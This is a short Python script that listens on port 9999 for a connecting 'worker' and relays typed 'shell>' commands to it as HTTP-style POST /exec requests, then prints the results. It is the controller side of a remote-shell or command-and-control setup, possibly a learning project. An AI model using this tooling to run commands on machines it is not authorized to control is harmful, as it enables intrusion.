import socket
from request import Request
from response import Response

server_sock = socket.socket()
server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_sock.bind(("0.0.0.0", 9999))
server_sock.listen(1)
print("[*] Waiting for worker...")
conn, addr = server_sock.accept()
server_sock.close()
print(f"[+] Worker connected from {addr}")

while True:
    cmd = input("shell> ").strip()
    if not cmd:
        continue
    conn.sendall(Request(method="POST", uri="/exec", body=cmd.encode()).dump())
    if cmd == "exit":
        break

    raw = b""
    while True:
        raw += conn.recv(4096)
        if b"\r\n\r\n" in raw:
            header_part, _, body_part = raw.partition(b"\r\n\r\n")
            content_length = None
            for line in header_part.split(b"\r\n")[1:]:
                if line.lower().startswith(b"content-length:"):
                    content_length = int(line.split(b":", 1)[1].strip())
                    break
            if content_length is None or len(body_part) >= content_length:
                break

    print(Response.load(raw).body.decode(errors="replace"))

conn.close()